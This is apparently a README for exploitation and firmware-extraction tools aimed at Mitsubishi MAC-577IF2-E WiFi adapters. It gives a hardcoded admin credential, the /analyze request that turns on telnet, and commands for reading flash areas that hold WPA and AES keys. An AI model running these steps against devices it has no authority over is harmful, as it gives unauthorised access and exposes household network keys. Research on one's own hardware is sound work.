# MAC-577IF2-E Analysis Tools

A collection of tools for analyzing and extracting firmware from Mitsubishi MAC-577IF2-E WiFi adapters.

Based on research from: https://github.com/ncaunt/meldec/issues/2

## Overview

These tools leverage discovered vulnerabilities to:
- Access admin HTTP endpoints using known credentials
- Enable telnet access via the `/analyze` endpoint  
- Execute diagnostic commands via telnet
- Extract firmware from flash memory
- Handle device crashes and recovery automatically

## Known Working Credentials

- **Admin**: `admin:me1debug@0567`
- **User**: `user:[KEY from device label]`

## Tools

### 1. mac577if2e_cli.py - Comprehensive CLI Tool

Interactive command-line interface for device exploration.

**Basic Usage:**
```bash
# Test connectivity
python3 mac577if2e_cli.py 192.168.0.54 test

# Scan all known HTTP endpoints
python3 mac577if2e_cli.py 192.168.0.54 scan

# Enable telnet access
python3 mac577if2e_cli.py 192.168.0.54 enable-telnet

# Execute telnet commands
python3 mac577if2e_cli.py 192.168.0.54 telnet "p"
python3 mac577if2e_cli.py 192.168.0.54 telnet "flash sector read=0,32"

# Query device info
python3 mac577if2e_cli.py 192.168.0.54 info

# Read flash memory
python3 mac577if2e_cli.py 192.168.0.54 flash --offset 0x0 --size 32
python3 mac577if2e_cli.py 192.168.0.54 flash --offset 0xe7 --size 32

# Scan flash for interesting data
python3 mac577if2e_cli.py 192.168.0.54 scan-flash --start 0x0 --end 0x1000

# Generate comprehensive device summary
python3 mac577if2e_cli.py 192.168.0.54 summary

# Query specific HTTP endpoint
python3 mac577if2e_cli.py 192.168.0.54 endpoint /analyze
python3 mac577if2e_cli.py 192.168.0.54 endpoint /analyze --method POST --data "debugStatus=ON"
```

### 2. mac577if2e_robust_extractor.py - Firmware Extraction

Robust firmware extraction with automatic crash recovery.

**Basic Usage:**
```bash
# Quick device info extraction
python3 mac577if2e_robust_extractor.py 192.168.0.54 --quick

# Extract firmware (small range for testing)
python3 mac577if2e_robust_extractor.py 192.168.0.54 --start 0x0 --end 0x1000 --output test_firmware.bin

# Full firmware extraction (may take a while)
python3 mac577if2e_robust_extractor.py 192.168.0.54 --start 0x0 --end 0x100000 --output full_firmware.bin

# Custom sector size
python3 mac577if2e_robust_extractor.py 192.168.0.54 --start 0x0 --end 0x10000 --size 64
```

### 3. mac577if2e_firmware_reader.py - Interactive Extraction

Original interactive firmware reader with updated credentials.

**Usage:**
```bash
python3 mac577if2e_firmware_reader.py 192.168.0.54
```

### 4. mac577if2e_test.py - Basic Testing

Simple connectivity and endpoint testing.

**Usage:**
```bash
python3 mac577if2e_test.py 192.168.0.54 me1debug@0567
```

## Known Telnet Commands

The following telnet commands are known to work:

### System Information
- `p` - Process and memory information (most reliable)
- `ver` - Version information
- `mac` - MAC address
- `date` - System date
- `mem` - Memory information
- `fmem` - Free memory

### Flash Memory Access
- `flash sector read=0,32` - Read 32 bytes from offset 0
- `flash sector read=c4,32` - Read configuration area
- `flash sector read=e7,32` - Read AES key area
- `flash sector read=ba,32` - Read WPA key area

### Debug Commands
- `debug info` - Debug information
- `soc` - Socket information
- `fs_dir` - Filesystem directory
- `fs_df` - Filesystem disk usage

## Important Notes

### Device Behavior
- The device may crash/reset after executing telnet commands
- Telnet access requires enabling via `/analyze` endpoint first
- Use `\r` line endings for telnet commands (not `\r\n`)
- Commands should be sent quickly after establishing telnet connection

### Security Considerations
- These tools exploit known vulnerabilities
- Only use on devices you own or have permission to test
- The admin credentials appear to be hardcoded in the firmware
- Device may log access attempts

### Flash Memory Layout
Based on research, interesting areas include:
- `0x0` - Firmware start
- `0xba` - WPA key storage
- `0xc4` - Domain name configuration  
- `0xc8` - ECHONET flag
- `0xe7` - AES key storage

## Examples

### Quick Device Assessment
```bash
# Test if device is accessible
python3 mac577if2e_cli.py 192.168.0.54 test

# Enable telnet and get basic info
python3 mac577if2e_robust_extractor.py 192.168.0.54 --quick
```

### Flash Memory Analysis
```bash
# Read firmware header
python3 mac577if2e_cli.py 192.168.0.54 flash --offset 0x0 --size 64

# Check for stored keys
python3 mac577if2e_cli.py 192.168.0.54 flash --offset 0xba --size 32
python3 mac577if2e_cli.py 192.168.0.54 flash --offset 0xe7 --size 32

# Scan for interesting data
python3 mac577if2e_cli.py 192.168.0.54 scan-flash --start 0x0 --end 0x2000
```

### Full Firmware Extraction
```bash
# Extract first 64KB (most important firmware sections)
python3 mac577if2e_robust_extractor.py 192.168.0.54 --end 0x10000 --output firmware_64k.bin

# Extract larger sections (will take longer)
python3 mac577if2e_robust_extractor.py 192.168.0.54 --end 0x100000 --output firmware_1mb.bin
```

## Troubleshooting

### Connection Issues
- Ensure device IP is correct
- Check that device is powered on and network accessible
- Verify admin credentials are working

### Telnet Issues  
- Device may have crashed - wait 30 seconds for recovery
- Re-enable telnet via: `python3 mac577if2e_cli.py 192.168.0.54 enable-telnet`
- Try smaller command sets to avoid overwhelming device

### Extraction Issues
- Use smaller end offsets for testing
- The robust extractor handles crashes automatically
- Check partial files (`.partial`) if extraction is interrupted

## Research Credit

This work is based on extensive research documented in:
https://github.com/ncaunt/meldec/issues/2

Special thanks to the researchers who discovered:
- The admin credential vulnerabilities
- Telnet activation via `/analyze` endpoint
- Flash reading commands and memory layout
- Line ending issues with telnet protocol
